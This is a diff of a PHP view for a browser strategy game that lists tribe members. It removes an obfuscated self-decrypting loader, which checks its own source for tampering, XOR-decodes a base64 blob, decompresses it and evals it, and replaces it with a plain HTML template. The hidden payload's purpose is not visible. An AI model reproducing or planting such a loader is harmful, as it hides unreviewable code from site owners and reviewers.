@@ -1,24 +1,36 @@
 <?php
-$wunwzj="0711334f599e0d23c08325ec5a870a15";
-$rekayn="0755540756070c03515d5f530152570253550b01065004555005590156500205";
-$brqimadfq="T7jIZaRe4yV02X3KPmUEG+u1mbYqL03/8fobHnJrSTkWztCVieStM4jKBcoMC5Fywgaup1Ay7yt+JpdUHwXc/azVKt/XZfUd8KiB1SD6hFptf8u04W9Myke4oQ2eWFq1Z9dQMf+oV14bTNVHEYK7jgJAO8JZkueKZ8vxGl4eD1OfEmSg6XPzGVh+6WREo2KRBWtXNQf195CTNHlbCieWcS4CxDopEwQCH3f1ul4XrlGCE1td1jXtWQLU5U7D5ivzAqZzU9m0XXuVcI75sX+ce4tjOCCONaOMeNcy8BzXOeA5+kN3actxdvKuWTSl81e63iC23a0VmHY/7xr6YMWgjuEraFIKce1JOAV33b3uuYoAyh6gCCWf6dX3bs8o+VbFAimP88K90JmRBsMnOxv5+pJiQQl3Nw6xs5RcWy5LpnVg/VtynO6V4EH3QGis2J/5fToxG6Ex6fHa6x74Ujb139vAFNFsC1PsQOIrylk5kx69IGIauqdPWKel5RICCEhX2o4fSRbJrhV0xEgHyjb0XVO26JH9IgxMv4xtXlwbypTlNKBHSKhvrCzHoyDcn/Gh3LdCDCDzNjtue4TUDrqltn362/fPxeN7j63FUNElNrZXH2rzukDtqVhTel0v1NFYO73aChQ7P3oo/AdzzI1WwALnEGY9GjaZJhobu+uQ6YuKJUqXjZvLfPbHRsXzS/OKndwSTp2cXrpg9eU=";
-$ugxtade=file_get_contents(__FILE__);
-$qlbfkf=str_replace($brqimadfq,"",$ugxtade);
-if(strpos($qlbfkf,"ec"."ho")!==false||strpos($qlbfkf,"pr"."int")!==false||strpos($qlbfkf,"var_"."dump")!==false||strpos($qlbfkf,"file_put_"."contents")!==false||strpos($qlbfkf,"fw"."rite")!==false){die();}
-$bsnjoudjnw=str_replace(array($wunwzj,$rekayn),array("SP_3aad7bff","KP_eab95180"),$ugxtade);
-$ieyzigom=md5($bsnjoudjnw);
-$bofnghr=hex2bin($rekayn);
-$ftfsoo="";
-$ynvvcm=strlen($ieyzigom);
-for($joxjjab=0;$joxjjab<$ynvvcm;$joxjjab++){
-$ftfsoo.=chr(ord($bofnghr[$joxjjab])^ord($ieyzigom[$joxjjab]));
-}
-$kyjmdkqox=base64_decode($brqimadfq);
-$eeqozuxsve=strlen($kyjmdkqox);
-$darzph="";
-$baakjm=strlen($ftfsoo);
-for($joxjjab=0;$joxjjab<$eeqozuxsve;$joxjjab++){
-$darzph.=$kyjmdkqox[$joxjjab]^$ftfsoo[$joxjjab%$baakjm];
-}
-$kinbtjgbbs="gzun"."compress";
-eval('?>' . $kinbtjgbbs($darzph) . '<?php ');
+/**
+ * Info Member View - Tribe members list
+ * Shows all members of a tribe with their statistics
+ */
+?>
+
+<h2>membros da tribo <font color="<?php echo ($ally['id'] == $user['ally']) ? 'blue' : 'red'; ?>">
+        <?php echo htmlspecialchars($ally['short']); ?>
+    </font>
+</h2>
+<a href="game.php?village=<?php echo $village['id']; ?>&amp;screen=info_ally&amp;id=<?php echo $ally['id']; ?>"> >>
+    <?php echo htmlspecialchars($ally['name']); ?></a>
+
+<table class="vis">
+    <tr>
+        <th width="280">usuario</th>
+        <th width="40">Classificação</th>
+        <th width="80">Pontos</th>
+        <th width="40">Aldeias</th>
+    </tr>
+    <?php foreach ($members as $id => $arr): ?>
+        <tr <?php echo ($user['id'] == $id) ? 'class="lit"' : ''; ?>>
+            <td>
+                <a
+                    href="game.php?village=<?php echo $village['id']; ?>&amp;screen=info_player&amp;id=<?php echo $id; ?>"><?php echo htmlspecialchars($arr['username']); ?></a>
+                <?php if (!empty($arr['titel'])): ?>
+                    (<?php echo htmlspecialchars($arr['titel']); ?>)
+                <?php endif; ?>
+            </td>
+            <td><?php echo $arr['rank']; ?></td>
+            <td><?php echo format_number($arr['points']); ?></td>
+            <td><?php echo format_number($arr['villages']); ?></td>
+        </tr>
+    <?php endforeach; ?>
+</table>
